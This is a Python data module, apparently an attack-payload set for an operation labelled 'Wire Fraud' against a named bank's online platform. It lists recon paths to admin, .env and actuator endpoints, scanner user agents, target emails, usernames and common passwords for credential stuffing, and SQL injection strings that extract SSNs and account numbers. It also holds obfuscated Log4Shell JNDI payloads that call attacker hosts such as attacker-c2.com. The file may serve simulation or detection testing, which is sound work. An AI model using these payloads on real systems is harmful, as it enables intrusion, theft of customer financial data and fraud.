"""
Financial Services payloads — Operation Wire Fraud
Targeting Meridian Bank's online banking platform.
"""

RECON_PATHS = [
    "/admin", "/admin/reports", "/admin/config", "/admin/login",
    "/api/docs", "/swagger", "/swagger.json", "/openapi.json",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/.env", "/.env.backup", "/config", "/config.yml",
    "/api/v1/accounts", "/api/v1/customers", "/api/account",
    "/api/auth", "/api/v1/transactions",
    "/online-banking/login", "/online-banking",
    "/swift/payment", "/swift",
    "/wire-transfer", "/api/wire-transfer",
]

SCANNER_AGENTS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Nmap Scripting Engine; banking-recon/2.1",
    "BankingRecon/1.0 (custom scanner)",
    "masscan/1.3.2",
    "zgrab/0.x",
    "python-requests/2.28.0",
    "FinancialAudit/3.1 (security scanner)",
]

ACCOUNT_IDS = list(range(10001, 10051))
CUSTOMER_EMAILS = [
    "admin@meridianbank.com", "john.smith@meridianbank.com",
    "sarah.jones@meridianbank.com", "m.johnson@meridianbank.com",
    "account.holder@meridianbank.com", "premium.user@meridianbank.com",
]

CRED_USERNAMES = [
    "john.smith", "sarah.jones", "m.johnson",
    "account.holder", "premium.user", "banking.admin",
    "wire.transfer.user", "j.doe", "s.miller",
]

CRED_PASSWORDS = [
    "Banking2023!", "Summer2024!", "Welcome1!", "Password123",
    "Meridian1!", "BankAdmin2024!", "Wire@2023", "Secure#Bank1",
]

SQLI_FINANCIAL = [
    "' OR 1=1--",
    "amount=' OR 1=1--",
    "1 UNION SELECT * FROM transactions--",
    "account_id=1 UNION SELECT ssn,account_number,balance FROM accounts--",
    "' OR EXISTS(SELECT * FROM wire_transfers WHERE amount > 10000)--",
    "1; SELECT * FROM swift_payments--",
    "' UNION SELECT null,routing_number,account_number FROM accounts--",
    "1 AND SLEEP(5)--",
    "' OR '1'='1' AND account_type='PREMIUM'--",
]

LOG4SHELL_PAYLOADS = [
    {
        "ua": "${jndi:ldap://attacker-c2.com/banking-exploit}",
        "header_value": "${jndi:ldap://192.168.1.1:1389/Banking}",
        "x_request_id": "${jndi:ldap://attacker.com/swift-rce}",
    },
    {
        "ua": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker-c2.com/Exploit}",
        "header_value": "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/banking}",
        "x_request_id": "${jndi:rmi://attacker.com:1099/swift-exploit}",
    },
    {
        "ua": "${jndi:dns://attacker-c2.com/banking-recon}",
        "header_value": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
        "x_request_id": "${jndi:ldap://attacker.com/payment-middleware}",
    },
]
